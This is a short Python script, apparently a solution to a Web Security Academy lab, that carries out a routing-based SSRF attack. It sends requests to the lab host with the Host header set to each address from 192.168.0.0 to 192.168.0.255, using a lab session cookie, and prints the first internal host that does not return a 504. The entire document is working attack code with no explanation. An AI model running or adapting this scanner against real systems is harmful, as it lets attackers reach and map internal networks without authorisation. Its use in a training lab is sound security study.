import requests
import http.client

url = 'https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net/?https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net'

def SSRF():
    connection = http.client.HTTPSConnection("acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net")

    for i in range(0, 256):
        connection.request("GET", "https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net/", headers={
            'Host': '192.168.0.' + str(i),
            'Cookie': '_lab=46%7cMCwCFB9hB4xwt69WL7ojJT2kCFcqJFONAhQUpa8Sh7BUDSjtWt%2bjm%2f04%2bA%2ffWIXSBq9atYlHwNHw92V6GjickKfNlKsQXBEhErtZActuwe4Oye%2bj69ITyYt%2fmgd5hugo7BpAkupzqwXFKVSseFSK%2fqnWEA735A1Y6pppBFpfOvJS9nM%3d'
        })
        response = connection.getresponse()

        if response.status != 504:
            print(i)
            print(response.read().decode())
            break
    
SSRF()